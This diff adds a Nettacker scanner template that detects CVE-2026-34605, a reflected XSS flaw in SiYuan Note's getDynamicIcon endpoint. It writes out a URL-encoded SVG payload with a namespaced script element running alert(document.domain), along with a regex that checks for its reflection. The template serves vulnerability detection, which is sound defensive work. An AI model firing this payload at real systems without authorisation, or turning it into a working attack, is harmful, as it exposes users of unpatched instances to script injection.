@@ -1,0 +1,57 @@
+info:
+  name: siyuan_cve_2026_34605_vuln
+  author: Nettacker Team
+  severity: medium
+  description: |
+    Detects a reflected Cross-Site Scripting (XSS) vulnerability 
+    in SiYuan Note versions up to 3.6.1. The application improperly
+    sanitizes SVG content supplied to the `/api/icon/getDynamicIcon` endpoint,
+    allowing SVG elements with namespace prefixes to bypass filtering. 
+    Successful detection indicates that attacker-controlled SVG content
+    is reflected in the generated image response and may lead to client-side JavaScript execution when processed by a user's browser.
+  references:
+    - https://github.com/siyuan-note/siyuan/security/advisories/GHSA-73g7-86qr-jrg3
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-34605
+  profiles:
+    - vuln
+    - http
+    - cve
+    - cve2026
+    - siyuan
+    - xss
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 5
+        headers:
+          User-Agent: "{user_agent}"
+        ssl: false
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/api/icon/getDynamicIcon?type=8&color=red&content=%3C%2Ftext%3E%3Cx%3Ascript%20xmlns%3Ax%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3Ealert%28document.domain%29%3C%2Fx%3Ascript%3E%3Ctext%3E"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200"
+              reverse: false
+            headers:
+              Content-Type:
+                regex: "image/svg\\+xml"
+                reverse: false
+            content:
+              regex: (?s)(?=.*id="dynamic_icon_type8")(?=.*</text><x:script xmlns:x="http://www\.w3\.org/2000/svg">alert\(document\.domain\)</x:script><text>).*
+              reverse: false
